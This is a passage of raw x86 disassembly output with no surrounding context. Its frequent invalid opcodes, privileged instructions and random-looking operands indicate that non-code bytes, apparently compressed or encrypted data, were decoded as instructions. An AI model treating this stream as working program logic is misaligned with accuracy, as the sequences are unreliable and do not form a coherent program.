  41e0b3:	fbstp  TBYTE PTR [ebx+0x36]
  41e0b6:	pusha  
  41e0b7:	loope  0x41e0a0
  41e0b9:	push   es
  41e0ba:	loopne 0x41e0a5
  41e0bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0bd:	push   ss
  41e0be:	cmp    eax,DWORD PTR [ebx+ebx*2]
  41e0c1:	jp     0x41e0ad
  41e0c3:	(bad)  
  41e0c4:	iret   
  41e0c5:	hlt    
  41e0c6:	mov    ah,0x27
  41e0c8:	loopne 0x41e07d
  41e0ca:	js     0x41e070
  41e0cc:	cmc    
  41e0cd:	mov    eax,0x2c0e9633
  41e0d2:	cmp    bl,BYTE PTR [ebx+ebx*2+0x66c48ff5]
  41e0d9:	jle    0x41e076
  41e0db:	pop    es
  41e0dc:	xchg   BYTE PTR [ecx],cl
  41e0de:	jmp    FWORD PTR [edx-0x52fc627e]
  41e0e4:	cwde   
  41e0e5:	xchg   DWORD PTR [edx-0x45],ebx
  41e0e8:	js     0x41e0dd
  41e0ea:	push   edx
  41e0eb:	(bad)
  41e0ee:	or     al,0x9
  41e0f0:	mov    esp,0x5bbe4323
  41e0f5:	test   BYTE PTR [ecx],bl
  41e0f7:	cmp    DWORD PTR [esi-0x35a595e6],ebx
  41e0fd:	(bad)  
  41e0fe:	mov    DWORD PTR [ebx],ecx
  41e100:	shl    DWORD PTR [esi+0x31],cl
  41e103:	mov    DWORD PTR [ebp-0x5091912c],esi
  41e109:	and    bl,BYTE PTR [edi-0x53d62e1e]
  41e10f:	jns    0x41e100
  41e111:	dec    esp
  41e112:	add    ch,dh
  41e114:	inc    ebx
  41e115:	jg     0x41e0d9
  41e117:	ds jne 0x41e179
  41e11a:	mov    ds,WORD PTR [ecx+0x1f1da46a]
  41e120:	pop    ss
  41e121:	stos   BYTE PTR es:[edi],al
  41e122:	jl     0x41e0af
  41e124:	lea    eax,[edi]
  41e126:	cmp    eax,0x17e69fb2
  41e12b:	mov    BYTE PTR [ebx-0xaee3823],0x83
  41e132:	gs stos BYTE PTR es:[edi],al
  41e134:	nop
  41e135:	outs   dx,DWORD PTR ds:[esi]
  41e136:	shr    DWORD PTR [ecx-0x1d],cl
  41e139:	mov    al,0xdf
  41e13b:	mov    edi,0xb4469c10
  41e140:	(bad)  
  41e142:	push   0xffffffff
  41e144:	mov    WORD PTR [esi],ss
  41e146:	and    edx,esi
  41e148:	cli    
  41e149:	scas   eax,DWORD PTR es:[edi]
  41e14a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e14b:	push   0xfffffffb
  41e14d:	std    
  41e14e:	stos   BYTE PTR es:[edi],al
  41e14f:	sbb    al,0xb2
  41e151:	mov    ah,0xc1
  41e153:	add    DWORD PTR [eax-0x2b3bd660],edx
  41e159:	mov    al,BYTE PTR [edi+ebp*2-0x4ffecdb5]
  41e160:	or     al,0x8b
  41e162:	cmp    ah,BYTE PTR [edx+0x673c5aff]
  41e168:	in     eax,dx
  41e169:	cli    
  41e16a:	fdiv   DWORD PTR [ebx+0x1a]
  41e16d:	sub    BYTE PTR [eax-0x3c],0x7
  41e171:	dec    eax
  41e172:	sub    BYTE PTR [ebx],bh
  41e174:	shl    BYTE PTR [eax+0x46],cl
  41e177:	lds    esi,FWORD PTR [edx+0x30]
  41e17a:	(bad)  
  41e17b:	sub    BYTE PTR [esi+0x3c],ah
  41e17e:	dec    esi
  41e17f:	add    al,0x55
  41e181:	push   ecx
  41e182:	shl    DWORD PTR [ebx],cl
  41e184:	data16 mov al,0xa
  41e187:	fistp  WORD PTR ds:0x42f773f7
  41e18d:	xchg   BYTE PTR cs:[esi+0x60],cl
  41e191:	add    edx,DWORD PTR [ebx+eiz*2]
  41e194:	push   ds
  41e195:	dec    eax
  41e196:	dec    edx
  41e197:	xchg   BYTE PTR [ecx+0x72],ah
  41e19a:	repnz es pop ebx
  41e19d:	add    BYTE PTR [edx-0x1b760096],al
  41e1a3:	stc    
  41e1a4:	pop    ebp
  41e1a5:	xchg   DWORD PTR [esi-0x1d],edi
  41e1a8:	sbb    eax,0x4b628950
  41e1ad:	jne    0x41e217
  41e1af:	jmp    0x98:0x6b3cd91a
  41e1b6:	ret    
  41e1b7:	lods   eax,DWORD PTR ds:[esi]
  41e1b8:	into   
  41e1b9:	push   edi
  41e1ba:	ins    DWORD PTR es:[edi],dx
  41e1bb:	adc    esp,DWORD PTR ds:0x8237a95
  41e1c1:	lods   al,BYTE PTR ds:[esi]
  41e1c2:	lea    edx,[eax+0x56388ed]
  41e1c8:	sub    DWORD PTR [ebx+0x66],esp
  41e1cb:	scas   eax,DWORD PTR es:[edi]
  41e1cc:	fs ins DWORD PTR es:[edi],dx
  41e1ce:	sub    al,0x88
  41e1d0:	retf   
  41e1d1:	rcr    DWORD PTR [ebp-0x23],0x45
  41e1d5:	enter  0x33d5,0xaf
  41e1d9:	sbb    bl,bl
  41e1db:	dec    esi
  41e1dc:	loopne 0x41e22b
  41e1de:	adc    dh,dl
  41e1e0:	in     al,dx
  41e1e1:	mov    bl,0xa9
  41e1e3:	aam    0xfd
  41e1e5:	and    al,0x9d
  41e1e7:	mov    al,ds:0x6f1d2e8
  41e1ec:	xor    eax,0xc5510135
  41e1f1:	cmovbe ebx,DWORD PTR [ecx+0x4]
  41e1f5:	test   BYTE PTR [esi-0x2c44f1d9],0x16
  41e1fc:	out    dx,eax
  41e1fd:	sub    bh,ch
  41e1ff:	add    al,0x67
  41e201:	cmp    dl,BYTE PTR [esp+ebx*4]
  41e204:	push   ebx
  41e205:	loop   0x41e279
  41e207:	ret    0x54e3
  41e20a:	adc    al,0x3e
  41e20c:	cmp    DWORD PTR [esi-0x8],0xd2e5d2b6
  41e213:	daa    
  41e214:	pop    ebp
  41e215:	test   DWORD PTR [ebp+0x72],eax
  41e218:	dec    ebx
  41e219:	sub    al,0x2
  41e21b:	inc    esi
  41e21c:	das    
  41e21d:	inc    edx
  41e21e:	add    DWORD PTR [eax+esi*4],0xffffffc3
  41e222:	jp     0x41e1a7
  41e224:	mov    ebx,0x3bfb8d14
  41e229:	inc    ecx
  41e22a:	mov    eax,0xc52da169
  41e22f:	jp     0x41e260
  41e231:	pusha  
  41e232:	jmp    0x41e1b6
  41e234:	push   ss
  41e235:	sub    DWORD PTR [esp+eax*2-0x2318806b],ebp
  41e23c:	rcl    DWORD PTR ds:0x79dffd7d,cl
  41e242:	push   ecx
  41e243:	sub    cl,ch
  41e245:	push   esp
  41e246:	xchg   esi,eax
  41e247:	ins    BYTE PTR es:[edi],dx
  41e248:	inc    edx
  41e249:	test   BYTE PTR [edi+eax*2],ch
  41e24c:	mov    ebp,DWORD PTR [ebx+ecx*8+0xc3dcb00]
  41e253:	jbe    0x41e2c5
  41e255:	or     edi,esi
  41e257:	mov    edx,0xc645b804
  41e25c:	xor    eax,0x5685eff4
  41e261:	test   bl,cl
  41e263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e264:	jg     0x41e24e
  41e266:	aad    0xe2
  41e268:	imul   ebx,DWORD PTR ss:[ebp-0x32],0x5997ecb2
  41e270:	jnp    0x41e2c8
  41e272:	push   cs
  41e273:	ds js  0x41e1f7
  41e276:	je     0x41e218
  41e278:	rol    DWORD PTR [edi-0x3f],cl
  41e27b:	loopne 0x41e2b3
  41e27d:	stc    
  41e27e:	jae    0x41e2cc
  41e280:	jp     0x41e233
  41e282:	(bad)  
  41e283:	jle    0x41e222
  41e285:	sbb    al,BYTE PTR ds:0xa77854a1
  41e28b:	xor    eax,0xe860b290
  41e290:	inc    edx
  41e291:	imul   edx,edx,0xfffffffd
  41e294:	(bad)
  41e298:	pop    eax
  41e299:	sbb    BYTE PTR [edi+0x70ed70a1],al
  41e29f:	dec    eax
  41e2a0:	stos   BYTE PTR es:[edi],al
  41e2a1:	or     DWORD PTR [edi-0x46],edi
  41e2a4:	sub    ecx,DWORD PTR [edx-0x60fddffe]
  41e2aa:	xchg   esp,eax
  41e2ab:	enter  0x3272,0x5b
  41e2af:	cmp    esi,DWORD PTR [ebx-0x757cddc]
  41e2b5:	cwde   
  41e2b6:	sub    DWORD PTR [edi-0x7c],edx
  41e2b9:	or     BYTE PTR [ebp-0xa],dh
  41e2bc:	sub    BYTE PTR [edi-0x7f3d32cc],al
  41e2c2:	neg    esi
  41e2c4:	(bad)  
  41e2c5:	ficomp DWORD PTR [ebx]
  41e2c7:	mov    dl,0x5e
  41e2c9:	outs   dx,DWORD PTR ds:[esi]
  41e2ca:	rcl    BYTE PTR [ebx-0x33],cl
  41e2cd:	or     BYTE PTR [eax-0x45],dl
  41e2d0:	fnsave [esi]
  41e2d2:	cmp    al,0xa2
  41e2d4:	setg   BYTE PTR [edi*4+0x58040fa2]
  41e2dc:	xlat   BYTE PTR ds:[ebx]
  41e2dd:	inc    esp
  41e2de:	add    eax,0xee43f345
  41e2e3:	es aaa 
  41e2e5:	add    ebx,0xf7cde1c9
  41e2eb:	fimul  WORD PTR [ebx]
  41e2ed:	add    eax,0x7dbaa4f1
  41e2f2:	mov    ds:0x84d2ba09,al
  41e2f7:	daa    
  41e2f8:	dec    esi
  41e2f9:	in     al,0x2e
  41e2fb:	loope  0x41e2aa
  41e2fd:	and    eax,0xf0cfde04
  41e302:	pop    esi
  41e303:	(bad)  
  41e304:	aas    
  41e305:	xlat   BYTE PTR ds:[ebx]
  41e306:	retf   
  41e307:	and    al,0x7e
  41e309:	mov    al,0xd
  41e30b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e30c:	test   dh,bl
  41e30e:	xor    eax,DWORD PTR [ebx-0x20]
  41e311:	jae    0x41e2ca
  41e313:	xchg   cl,ah
  41e315:	push   0x7ab2200e
  41e31a:	dec    esp
  41e31b:	xchg   esp,eax
  41e31c:	mov    edx,ebp
  41e31e:	xor    cl,BYTE PTR [edx+0x165547ea]
  41e324:	ror    BYTE PTR [eax-0x1a9c1835],0x7
  41e32b:	lock sahf 
  41e32d:	jb     0x41e35d
  41e32f:	adc    bh,dl
  41e331:	push   ss
  41e332:	dec    edx
  41e333:	(bad)  
  41e334:	out    dx,al
  41e335:	push   es
  41e336:	pop    ds
  41e337:	and    dh,dl
  41e339:	stc    
  41e33a:	inc    edx
  41e33b:	xor    BYTE PTR [edi-0xb],dl
  41e33e:	jmp    0x41e384
  41e340:	xchg   BYTE PTR [esi+ecx*2],bl
  41e343:	das    
  41e344:	(bad)
  41e347:	je     0x41e2f7
  41e349:	cli    
  41e34a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e34b:	lods   eax,DWORD PTR ds:[esi]
  41e34c:	jmp    0xddb1:0x4e1f9fdb
  41e353:	sub    edi,DWORD PTR [eax+0x76]
  41e356:	mov    bx,0xd4b9
  41e35a:	outs   dx,DWORD PTR ds:[esi]
  41e35b:	ret    0x688a
  41e35e:	push   ecx
  41e35f:	in     al,0xe4
  41e361:	push   ss
  41e362:	xor    DWORD PTR [edx],0x29
  41e365:	iret   
  41e366:	xchg   edi,eax
  41e367:	gs jmp 0x41e33a
  41e36a:	ds pop eax
  41e36c:	adc    DWORD PTR [edi],0xa84797aa
  41e372:	inc    esi
  41e373:	in     eax,dx
  41e374:	fnstenv [eax-0x5aa04a6d]
  41e37a:	mov    bl,ch
  41e37c:	xor    BYTE PTR [ebp+0x333ec119],cl
  41e382:	(bad)  
  41e383:	sub    BYTE PTR [edx],dl
  41e385:	pusha  
  41e386:	test   al,0xf9
  41e388:	push   ss
  41e389:	adc    esp,eax
  41e38b:	add    DWORD PTR [esi],ebp
  41e38d:	mov    dl,0xc2
  41e38f:	sbb    edx,esi
  41e391:	call   0x5612:0xdaf79a84
  41e398:	sbb    cl,BYTE PTR [edi]
  41e39a:	dec    eax
  41e39b:	jae    0x41e328
  41e39d:	sub    eax,0x2d
  41e3a0:	adc    al,0xe3
  41e3a2:	sub    al,0x36
  41e3a4:	hlt    
  41e3a5:	push   ebp
  41e3a6:	sub    DWORD PTR [ebx+0x77],0x5c
  41e3aa:	arpl   WORD PTR ds:0xe3dcd439,cx
  41e3b0:	mov    DWORD PTR [eax+0x72],esp
  41e3b3:	push   ds
  41e3b4:	jl     0x41e425
  41e3b6:	or     eax,DWORD PTR [eax+0x7ab54c85]
  41e3bc:	repz sbb ah,BYTE PTR [ebx-0x3cdff1a6]
  41e3c3:	cdq    
  41e3c4:	xor    BYTE PTR [eax],dl
  41e3c6:	sbb    al,0xaa
  41e3c8:	mov    dh,0xbd
  41e3ca:	fimul  WORD PTR [ebx+0x5fde309f]
  41e3d0:	sbb    dl,bh
  41e3d2:	push   0x2
  41e3d4:	fisubr DWORD PTR [edi-0x66]
  41e3d7:	push   0xffffff85
  41e3d9:	bound  edi,QWORD PTR [ecx+0x39]
  41e3dc:	popf   
  41e3dd:	and    ecx,DWORD PTR [esi]
  41e3df:	out    0x67,eax
  41e3e1:	dec    BYTE PTR [ecx+edx*1+0x5c]
  41e3e5:	div    DWORD PTR [ebp+0x12]
  41e3e8:	mov    bh,0x36
  41e3ea:	int3   
  41e3eb:	dec    edi
  41e3ec:	xchg   ecx,eax
  41e3ed:	and    edx,DWORD PTR [ecx-0x37bf5882]
  41e3f3:	sub    bh,BYTE PTR [ecx]
  41e3f5:	add    BYTE PTR [esi],0x92
  41e3f8:	aam    0x26
  41e3fa:	pop    ecx
  41e3fb:	dec    edi
  41e3fc:	mov    dl,bl
  41e3fe:	adc    eax,DWORD PTR [esi+0xe]
  41e401:	dec    edi
  41e402:	mov    dh,0xe2
  41e404:	sub    BYTE PTR [eax-0x60976217],0xec
  41e40b:	and    bl,dl
  41e40d:	mov    cl,0xda
  41e40f:	call   0xf03e6fd9
  41e414:	(bad)  
  41e415:	mov    bl,0x6c
  41e417:	mov    ecx,eax
  41e419:	aad    0x0
  41e41b:	jmp    0x41e3f5
  41e41d:	fwait
  41e41e:	dec    ecx
  41e41f:	adc    BYTE PTR [ecx+0x7a],bh
  41e422:	hlt    
  41e423:	ins    DWORD PTR es:[edi],dx
  41e424:	inc    esp
  41e425:	push   edx
  41e426:	mov    bh,al
  41e428:	scas   eax,DWORD PTR es:[edi]
  41e429:	add    DWORD PTR [edx],0x74e8ad72
  41e42f:	sub    dh,bl
  41e431:	lds    ebp,FWORD PTR [esi]
  41e433:	daa    
  41e434:	(bad)  
  41e435:	mov    esi,0x9156d1e7
  41e43a:	outs   dx,BYTE PTR ds:[esi]
  41e43b:	ret    
  41e43c:	hlt    
  41e43d:	adc    ebx,edi
  41e43f:	pop    esi
  41e440:	push   cs
  41e441:	fadd   DWORD PTR [ecx+0xf]
  41e444:	or     DWORD PTR [esi-0x4f],ecx
  41e447:	mov    esi,?
  41e449:	or     edx,DWORD PTR [edi-0x12]
  41e44c:	adc    edi,esi
  41e44e:	cmp    BYTE PTR [eax+esi*2],ch
  41e451:	data16 fwait
  41e453:	sub    DWORD PTR [eax-0x3b],esp
  41e456:	adc    al,0x1e
  41e458:	or     ebp,eax
  41e45a:	ficom  DWORD PTR [eax]
  41e45c:	sbb    BYTE PTR [edi+0x2d],bl
  41e45f:	rcr    DWORD PTR [edx],cl
  41e461:	add    al,0xd7
  41e463:	jl     0x41e3f6
  41e465:	retf   0xb775
  41e468:	cmp    DWORD PTR [esi],edx
  41e46a:	mov    al,0xb0
  41e46c:	mov    ebx,0xdbb80f35
  41e471:	sahf   
  41e472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e473:	mov    eax,ds:0x5d3e7ec6
  41e478:	ror    BYTE PTR [ecx],0x49
  41e47b:	inc    edx
  41e47c:	popf   
  41e47d:	inc    edx
  41e47e:	add    ch,BYTE PTR [edi+0x1953ddd5]
  41e484:	mov    gs,WORD PTR [ecx+eiz*8+0x29]
  41e488:	in     al,dx
  41e489:	test   edi,ecx
  41e48b:	or     esp,ebx
  41e48d:	pop    ss
  41e48e:	xor    al,ah
  41e490:	sbb    al,0x61
  41e492:	mov    cl,0x71
  41e494:	pop    esi
  41e495:	sbb    DWORD PTR [esi],edx
  41e497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e498:	popf   
  41e499:	add    BYTE PTR [esp+ecx*8-0x700eea5b],0xbb
  41e4a1:	ss jmp 0x3a700fc0
  41e4a7:	ror    bl,0xff
  41e4aa:	scas   eax,DWORD PTR es:[edi]
  41e4ab:	std    
  41e4ac:	stos   DWORD PTR es:[edi],eax
  41e4ad:	stc    
  41e4ae:	imul   edi,DWORD PTR [edi+0x39],0xacc8176d
  41e4b5:	js     0x41e458
  41e4b7:	adc    bh,BYTE PTR [edx-0x5e5a0714]
  41e4bd:	(bad)  
  41e4be:	fidiv  DWORD PTR [ecx-0x51aeae7e]
  41e4c4:	outs   dx,DWORD PTR ds:[esi]
  41e4c5:	cmp    eax,0x5b10d933
  41e4ca:	xor    cl,dh
  41e4cc:	xlat   BYTE PTR ds:[ebx]
  41e4cd:	lock nop
  41e4cf:	scas   eax,DWORD PTR es:[edi]
  41e4d0:	xor    ebx,DWORD PTR [edi]
  41e4d2:	and    eax,0xffad4b73
  41e4d7:	xlat   BYTE PTR ds:[ebx]
  41e4d8:	push   ss
  41e4d9:	in     eax,0x7d
  41e4db:	std    
  41e4dc:	jmp    0x41e510
  41e4de:	clc    
  41e4df:	dec    edi
  41e4e0:	out    dx,eax
  41e4e1:	mov    ch,0xcd
  41e4e3:	cmp    eax,0x7ea11767
  41e4e8:	in     al,dx
  41e4e9:	fisub  WORD PTR [ecx-0x43467514]
  41e4ef:	test   al,0xd8
  41e4f1:	test   al,0x3e
  41e4f3:	in     eax,dx
  41e4f4:	gs sbb eax,0x69d03f4c
  41e4fa:	arpl   bx,dx
  41e4fc:	popa   
  41e4fd:	frstor [esi+0x12]
  41e500:	xchg   esi,eax
  41e501:	lock xor al,0xb8
  41e504:	out    dx,eax
  41e505:	pop    ds
  41e506:	icebp  
  41e507:	push   esp
  41e508:	mov    ebx,ebx
  41e50a:	push   0x8db78fdc
  41e50f:	loop   0x41e58e
  41e511:	jmp    0x8bacaadf
  41e516:	add    ebp,eax
  41e518:	icebp  
  41e519:	xchg   ebx,eax
  41e51a:	ret    
  41e51b:	jge    0x41e4fe
  41e51d:	cmp    dl,BYTE PTR [eax]
  41e51f:	sbb    al,0x8b
  41e521:	ds cmp al,0xd9
  41e524:	jge    0x41e4c6
  41e526:	je     0x41e584
  41e528:	call   0xbaddb982
  41e52d:	mov    bh,0x63
  41e52f:	add    DWORD PTR [esi+0x587d3a47],esp
  41e535:	jo     0x41e572
  41e537:	adc    al,BYTE PTR [ecx]
  41e539:	xchg   DWORD PTR [ecx-0x44],eax
  41e53c:	out    dx,eax
  41e53d:	outs   dx,BYTE PTR ds:[si]
  41e53f:	or     BYTE PTR [ebp+eax*1+0xd],0x91
  41e544:	sar    DWORD PTR [edi],0x55
  41e547:	push   ss
  41e548:	adc    DWORD PTR [esi-0x4a],ebp
  41e54b:	pop    es
  41e54c:	xchg   esi,eax
  41e54d:	dec    ecx
  41e54e:	pop    ebp
  41e54f:	mov    esp,0x6175dd73
  41e554:	adc    edx,DWORD PTR [edi+eax*4-0x15]
  41e558:	cmp    al,0x75
  41e55a:	inc    esp
  41e55b:	clc    
  41e55c:	mov    eax,ds:0x6b5e765e
  41e561:	or     BYTE PTR [ebx+0x15186ba9],0x8b
  41e568:	cmp    al,0x50
  41e56a:	add    edi,DWORD PTR [ecx-0x337c9bc9]
  41e570:	xor    BYTE PTR [esi-0x6c],cl
  41e573:	mov    ebp,0x3c1cbd1d
  41e578:	xor    al,0xd5
  41e57a:	inc    ebx
  41e57b:	loopne 0x41e5ce
  41e57d:	mov    ds:0x5bc6cfd4,eax
  41e582:	push   cs
  41e583:	push   0xffffff9e
  41e585:	loopne 0x41e53e
  41e587:	fwait
  41e588:	cmp    BYTE PTR [ebx],dh
  41e58a:	adc    ecx,esi
  41e58c:	rcl    edx,cl
  41e58e:	jle    0x41e535
  41e590:	push   ss
  41e591:	fs fmul st,st(3)
  41e594:	xor    bl,BYTE PTR [ecx]
  41e596:	xchg   esp,eax
  41e597:	jecxz  0x41e596
  41e599:	sub    BYTE PTR [edx-0x6f],ch
  41e59c:	shl    DWORD PTR [edi+0x6922d32b],cl
  41e5a2:	aas    
  41e5a3:	mov    BYTE PTR [ebx],dl
  41e5a5:	inc    ecx
  41e5a6:	xchg   esp,eax
  41e5a7:	jmp    0x41e5d0
  41e5a9:	jle    0x41e5c4
  41e5ab:	add    DWORD PTR [ebx-0x310c2f5],ebp
  41e5b1:	outs   dx,DWORD PTR ds:[esi]
  41e5b2:	mov    eax,ds:0x83bb6a8c
  41e5b7:	xchg   edx,eax
  41e5b8:	xchg   edi,eax
  41e5b9:	repz push esp
  41e5bb:	jnp    0x41e546
  41e5bd:	adc    al,0x3a
  41e5bf:	push   ebp
  41e5c0:	and    DWORD PTR [ebx+ebp*2+0x54],edi
  41e5c4:	lock test BYTE PTR [ebx+eiz*2+0x5b],dl
  41e5c9:	cmp    dh,0x50
  41e5cc:	test   BYTE PTR [ecx+0x26e51d52],dl
  41e5d2:	sti    
  41e5d3:	jnp    0x41e605
  41e5d5:	jge    0x41e653
  41e5d7:	int    0x7a
  41e5d9:	data16 add ch,BYTE PTR [esi-0x3425a41e]
  41e5e0:	jne    0x41e65b
  41e5e2:	mov    ds:0x59c4dd36,eax
  41e5e7:	jmp    0x41e615
  41e5e9:	ins    BYTE PTR es:[edi],dx
  41e5ea:	fadd   QWORD PTR [eax-0x60]
  41e5ed:	mov    ds:0xd587c6d9,eax
  41e5f2:	jnp    0x41e57d
  41e5f4:	lahf   
  41e5f5:	ins    BYTE PTR es:[edi],dx
  41e5f6:	loope  0x41e5ae
  41e5f8:	daa    
  41e5f9:	xchg   esi,eax
  41e5fa:	dec    DWORD PTR [edx-0x70]
  41e5fd:	xchg   esi,eax
  41e5fe:	ins    DWORD PTR es:[edi],dx
  41e5ff:	jno    0x41e646
  41e601:	bound  esi,QWORD PTR [esi+0x6cf8d58f]
  41e607:	mov    eax,0x8acc8903
  41e60c:	in     eax,dx
  41e60d:	ror    bh,cl
  41e60f:	inc    edx
  41e610:	test   bl,0xcb
  41e613:	pop    esp
  41e614:	xchg   DWORD PTR [esi-0xa421642],ecx
  41e61a:	and    eax,0x4617a05e
  41e61f:	ins    DWORD PTR es:[edi],dx
  41e620:	jmp    0xf282:0xe4273fb5
  41e627:	xor    al,BYTE PTR [esp+eiz*2+0x12c0a8d6]
  41e62e:	mov    WORD PTR [eax+edx*8-0xb026253],es
  41e635:	sub    DWORD PTR [ecx-0x64],edi
  41e638:	es jnp 0x41e5c1
  41e63b:	pop    esp
  41e63c:	push   esi
  41e63d:	ja     0x41e671
  41e63f:	inc    ecx
  41e640:	jbe    0x41e5f4
  41e642:	lock mov ah,0xcb
  41e645:	cmp    al,0x35
  41e647:	dec    edx
  41e648:	pop    ebp
  41e649:	js     0x41e67d
  41e64b:	shl    DWORD PTR [bx+di-0xb3a],0xdd
  41e651:	xor    DWORD PTR [ebx],edi
  41e653:	out    0xbe,al
  41e655:	push   ebx
  41e656:	dec    edi
  41e657:	cmp    ecx,ecx
  41e659:	cwde   
  41e65a:	jmp    0x1c066897
  41e65f:	fst    QWORD PTR ds:0xaa67cad9
  41e665:	jo     0x41e5ee
  41e667:	aaa    
  41e668:	mov    DWORD PTR [edi+0x34],0x4c1c65bc
  41e66f:	and    al,0xfe
  41e671:	fcomip st,st(0)
  41e673:	mov    dl,BYTE PTR [edi-0x2c]
  41e676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e677:	outs   dx,DWORD PTR ds:[esi]
  41e678:	cld    
  41e679:	fs ss cli 
  41e67c:	push   ecx
  41e67d:	bound  edi,QWORD PTR [ecx-0x1c]
  41e680:	loopne 0x41e61b
  41e682:	xchg   edx,eax
  41e683:	ret    
  41e684:	push   ss
  41e685:	jmp    0xb9b3:0x986e0776
  41e68c:	pop    esp
  41e68d:	hlt    
  41e68e:	ret    0x68c8
  41e691:	mov    ebx,0x463c7c1f
  41e696:	inc    ecx
  41e697:	push   edi
  41e698:	aas    
  41e699:	push   edx
  41e69a:	div    DWORD PTR [edi-0x690e8bf3]
  41e6a0:	call   0xcb71:0x12006d60
  41e6a7:	arpl   cx,dx
  41e6a9:	aam    0xc1
  41e6ab:	lods   eax,DWORD PTR ds:[esi]
  41e6ac:	mov    ecx,0xfd379a5d
  41e6b1:	jno    0x41e688
  41e6b3:	ss inc ebx
  41e6b5:	xchg   ebx,eax
  41e6b6:	scas   al,BYTE PTR es:[edi]
  41e6b7:	rcl    ebp,1
  41e6b9:	cmp    eax,0x272b6b5c
  41e6be:	adc    bh,ch
  41e6c0:	mov    edx,0x2d7ac04b
  41e6c5:	in     al,dx
  41e6c6:	les    esp,FWORD PTR [edi-0x15]
  41e6c9:	lea    ebp,[esp+eiz*8-0x33189a1]
  41e6d0:	xor    BYTE PTR [edx-0x7ce575],cl
  41e6d6:	cmp    eax,ebp
  41e6d8:	loop   0x41e69f
  41e6da:	sub    al,0x40
  41e6dc:	hlt    
  41e6dd:	bnd jp 0x41e6a6
  41e6e0:	sahf   
  41e6e1:	sti    
  41e6e2:	mov    ebp,0xbf84166e
  41e6e7:	lods   al,BYTE PTR ds:[esi]
  41e6e8:	pop    ss
  41e6e9:	iret   
  41e6ea:	mov    bl,dh
  41e6ec:	mov    eax,ds:0xd9dd46a0
  41e6f1:	sub    BYTE PTR [ebx-0x68],ah
  41e6f4:	sub    DWORD PTR [ecx+0x4a],0x6d
  41e6f8:	sub    ebp,esi
  41e6fa:	sub    al,0x4e
  41e6fc:	stos   DWORD PTR es:[edi],eax
  41e6fd:	out    0x9f,al
  41e6ff:	int    0x75
  41e701:	or     bh,dl
  41e703:	dec    esp
  41e704:	sbb    BYTE PTR [eax-0x31],bh
  41e707:	add    esi,DWORD PTR [ecx-0x1771c3d3]
  41e70d:	mov    ecx,0x9a936653
  41e712:	fisttp DWORD PTR [eax-0x1260e4c]
  41e718:	neg    BYTE PTR ds:0x6548c0e2
  41e71e:	xchg   edx,eax
  41e71f:	call   0x438a90da
  41e724:	shr    BYTE PTR [ecx+ebx*1],0x18
  41e728:	push   esp
  41e729:	in     eax,0x19
  41e72b:	aam    0x2a
  41e72d:	add    al,0xba
  41e72f:	test   DWORD PTR [ebx-0x65],0xfdb353db
  41e736:	adc    DWORD PTR [eax],esp
  41e738:	call   0xfe03:0xce9429d6
  41e73f:	(bad)  
  41e740:	scas   eax,DWORD PTR es:[edi]
  41e741:	dec    ebx
  41e742:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e743:	sub    DWORD PTR [ebx-0x3d],ebx
  41e746:	(bad)  
  41e747:	mov    ebp,0xff51fef4
  41e74c:	or     BYTE PTR [edi-0x13071002],dl
  41e752:	mov    eax,ds:0xe3f1abd5
  41e757:	jns    0x41e702
  41e759:	lahf   
  41e75a:	jmp    0xb7ee:0xb1d36429
  41e761:	jmp    0xe9ec:0x67fd9603
  41e768:	add    al,0x36
  41e76a:	mov    esi,0xbab79080
  41e76f:	dec    ebp
  41e770:	inc    edi
  41e771:	and    DWORD PTR [edx],ecx
  41e773:	push   edi
  41e774:	pusha  
  41e775:	add    eax,0x3fdd8d89
  41e77a:	push   0x28c5d374
  41e77f:	and    dl,dl
  41e781:	int    0x58
  41e783:	add    dl,BYTE PTR [edx]
  41e785:	gs dec eax
  41e787:	pop    ds
  41e788:	push   ecx
  41e789:	jecxz  0x41e710
  41e78b:	pop    esi
  41e78c:	sti    
  41e78d:	inc    esi
  41e78e:	fmul   QWORD PTR [eax]
  41e790:	or     DWORD PTR [ecx+0x346d91fa],esp
  41e796:	sbb    BYTE PTR [eax],ah
  41e798:	in     eax,dx
  41e799:	(bad)  
  41e79a:	xchg   ebp,eax
  41e79b:	pop    esi
  41e79c:	fsubp  st(4),st
  41e79e:	pop    ss
  41e79f:	lods   eax,DWORD PTR ds:[esi]
  41e7a0:	icebp  
  41e7a1:	pop    ebx
  41e7a2:	xchg   esp,eax
  41e7a3:	pop    eax
  41e7a4:	xor    al,0x8b
  41e7a6:	xchg   esi,eax
  41e7a7:	dec    edi
  41e7a8:	jne    0x41e7ec
  41e7aa:	shl    BYTE PTR [esi-0x7ed8d2d5],1
  41e7b0:	xchg   edx,eax
  41e7b1:	inc    edi
  41e7b2:	idiv   ebx
  41e7b4:	int    0xc3
  41e7b6:	stos   DWORD PTR es:[edi],eax
  41e7b7:	jecxz  0x41e816
  41e7b9:	aam    0x63
  41e7bb:	arpl   WORD PTR [ecx],dx
  41e7bd:	call   0x3fd52c41
  41e7c2:	push   es
  41e7c3:	add    eax,DWORD PTR [ebx+0x51a372d9]
  41e7c9:	fs inc esi
  41e7cb:	adc    al,0x14
  41e7cd:	jo     0x41e824
  41e7cf:	sbb    DWORD PTR [edx+eax*2],esi
  41e7d2:	inc    esp
  41e7d3:	and    ah,ah
  41e7d5:	or     BYTE PTR gs:[ecx-0x75afc086],cl
  41e7dc:	scas   al,BYTE PTR es:[edi]
  41e7dd:	call   0x69d7c4a8
  41e7e2:	aaa    
  41e7e3:	out    0x37,al
  41e7e5:	es repnz mov ebx,?
  41e7e9:	add    edi,DWORD PTR [edi+eiz*2-0x14be31e0]
  41e7f0:	lds    esp,FWORD PTR cs:[esi+0x45]
  41e7f4:	adc    al,0xe0
  41e7f6:	movq   QWORD PTR [ecx],mm7
  41e7f9:	rcr    BYTE PTR [edi+0x54],1
  41e7fc:	mov    cl,0xce
  41e7fe:	jp     0x41e823
  41e800:	inc    esp
  41e801:	ins    BYTE PTR es:[edi],dx
  41e802:	dec    eax
  41e803:	add    al,BYTE PTR [ebx+eiz*2-0x39]
